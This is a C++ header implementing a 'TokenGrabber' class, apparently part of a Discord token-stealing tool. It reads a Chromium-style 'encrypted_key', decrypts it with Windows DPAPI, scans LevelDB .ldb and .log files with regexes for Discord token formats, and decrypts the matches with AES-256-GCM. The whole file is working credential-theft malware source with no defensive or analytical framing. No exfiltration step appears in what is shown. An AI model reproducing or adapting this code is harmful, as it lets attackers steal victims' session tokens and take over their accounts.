#pragma once

#include "utils/utils.hpp"

class TokenGrabber {
public:

    TokenGrabber(const std::vector<std::pair<std::string, std::string>> &p_list) {
        std::vector<std::pair<std::string, std::string>> valid_list;

        int index = 0;
        for (const std::pair<std::string, std::string> &_pair : p_list) {
            if (!std::filesystem::exists(_pair.first) || !std::filesystem::exists(_pair.second)) {
                printf("Path doesn't exist at index %d.\n", index);
            }
            else { valid_list.push_back(_pair); }
            index++;
        }
        path_list = valid_list;
    }

    bool initialize() {

        std::vector<std::string> key_list;
        bool return_code = true;

        std::vector<std::pair<std::string, std::string>> valid_list;

        int index = 0;
        for (const std::pair<std::string, std::string> &_pair : path_list) {

            std::string master_key;
            if (!get_master_key(_pair.first, master_key)) {
                printf("Couldn't fetch master key at the %dth index in the valid path list.\n", index);

                return_code = false;
            } else {
                valid_list.push_back(_pair);
                key_list.push_back(master_key);
                index++;
            }
        }

        master_key_list = key_list;
        path_list = valid_list;

        return return_code;
    }

    std::vector<std::string> collect_tokens() {

        std::vector<std::string> result;

        int index = 0;
        for (const std::pair<std::string, std::string> &_pair : path_list) {

             std::vector<std::string> encrypted_token_list;

            std::vector<std::regex> regex_list;
            regex_list.emplace_back(R"(dQw4w9WgXcQ:[^\"\[\]\(\)]*)");
            regex_list.emplace_back(R"(dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*)");
            regex_list.emplace_back("dQw4w9WgXcQ:(.*?)=");

            regex_list.emplace_back(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})");
            regex_list.emplace_back(R"(mfa\.[\w-]{84})");

            std::vector<std::thread> thread_list;
            std::mutex mtx;

            std::vector<std::string> contents;

            for (const std::filesystem::directory_entry &entry : std::filesystem::directory_iterator(_pair.second)) {
                if (entry.is_regular_file()) {
                    if (fileIO::has_extension(entry.path(), ".ldb") || fileIO::has_extension(entry.path(), ".log")) {

                        std::string content;
                        fileIO::read_utf8_file(entry.path().string(), content);

                        contents.push_back(content);
                    }
                }
            }

            for (std::string &content : contents) {
                std::thread _thread([&]() {
                    for (std::regex r : regex_list) {

                        std::sregex_iterator begin(content.begin(), content.end(), r);
                        std::sregex_iterator end;

                        std::vector<std::string> local_list;

                        for (std::sregex_iterator it = begin; it != end; ++it) {
                            std::smatch match = *it;
                            local_list.push_back(match.str());
                        }

                        std::lock_guard<std::mutex> lock(mtx);
                        encrypted_token_list.insert(encrypted_token_list.end(), local_list.begin(), local_list.end());
                    }
                });

                if (_thread.joinable()) {
                    _thread.join();
                }
            }

            for (const std::string &raw_token : encrypted_token_list) {

                if (raw_token.length() <= 12) { continue; }

                std::string trimmed_token = raw_token.substr(12);

                std::string token_frombase64;
                base64::decode(trimmed_token, token_frombase64);

                std::string decrypted_token;
                decrypt(token_frombase64, master_key_list[index], decrypted_token);

                result.push_back(decrypted_token);
            }

            index++;
        }

        utils::vector::remove_duplicates(result);

        return result;
    }
private:

    std::vector<std::pair<std::string, std::string>> path_list;
    std::vector<std::string> master_key_list;

    bool decrypt_win32(const std::string &in, std::string &out) {

        DATA_BLOB encryptedBlob;
        DATA_BLOB plaintextBlob;

        encryptedBlob.pbData = reinterpret_cast<BYTE *>(const_cast<char *>(in.data()));
        encryptedBlob.cbData = static_cast<DWORD>(in.size());

        bool success = CryptUnprotectData(&encryptedBlob, NULL, NULL, NULL, NULL, 0, &plaintextBlob);

        if (success) {
            out.assign(reinterpret_cast<char *>(plaintextBlob.pbData), plaintextBlob.cbData);
            LocalFree(plaintextBlob.pbData);
        }

        return success;
    }

    bool get_master_key(const std::string &path, std::string &out) {

        std::ifstream file(path.c_str());

        std::string contents((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

        std::vector<std::string> match_vector;
        utils::string::match_regex(contents, "\"encrypted_key\":\"([^\"]+)\"", match_vector);

        if (match_vector.empty()) { return false; }

        std::string encrypted_key = match_vector[0];

        std::string decoded64key;
        base64::decode(encrypted_key, decoded64key);
        decoded64key.erase(0, 5);

        return decrypt_win32(decoded64key, out);
    }

    bool trim_cipher(const std::string &original_data, std::string &out_pass, std::string &out_tag, std::string &iv) {
        if (original_data.size() < 15) {
            return false;
        }
        iv = original_data.substr(3, 12);
        if (original_data.size() < 15 + iv.size()) {
            return false;
        }
        std::string buf = original_data.substr(15);

        if (buf.size() < 16) {
            return false;
        }
        out_tag = buf.substr(buf.size() - 16);
        out_pass = buf.substr(0, buf.size() - 16);

        return true;
    }

    bool decrypt(const std::string &buff, const std::string &master_key, std::string &out) {
        if (master_key.empty()) {
            return false;
        }

        std::string iv_s, out_pass, out_tag;
        if (!trim_cipher(buff, out_pass, out_tag, iv_s)) {
            return false;
        }

        std::vector<unsigned char> key;
        utils::conversion::string_to_byte_vector(master_key, key);

        std::vector<unsigned char> ciphertext;
        utils::conversion::string_to_byte_vector(out_pass, ciphertext);

        std::vector<unsigned char> tag;
        utils::conversion::string_to_byte_vector(out_tag, tag);

        std::vector<unsigned char> iv;
        utils::conversion::string_to_byte_vector(iv_s, iv);

        int ciphertext_len = out_pass.size();
        std::vector<unsigned char> plaintext(ciphertext_len + 1);

        int plaintext_len = decrypt_gcm256(ciphertext.data(), ciphertext_len, tag.data(), key.data(), iv.data(), iv.size(), plaintext.data());

        if (plaintext_len < 0) {
            return false;
        }

        out = std::string(reinterpret_cast<char *>(plaintext.data()), plaintext_len);
        return true;
    }

    int decrypt_gcm256(unsigned char *ciphertext, int ciphertext_len, unsigned char *tag,
        unsigned char *key, unsigned char *iv, int iv_len,
        unsigned char *plaintext) {
        EVP_CIPHER_CTX *ctx;
        int len;
        int plaintext_len;
        int ret;

        ctx = EVP_CIPHER_CTX_new();

        EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);

        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, iv_len, NULL);

        EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv);

        EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len);

        plaintext_len = len;

        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, tag);

        ret = EVP_DecryptFinal_ex(ctx, plaintext + len, &len);

        EVP_CIPHER_CTX_free(ctx);

        if (ret > 0) {
            plaintext_len += len;
            return plaintext_len;
        }
        else {
            return -1;
        }
    }
};
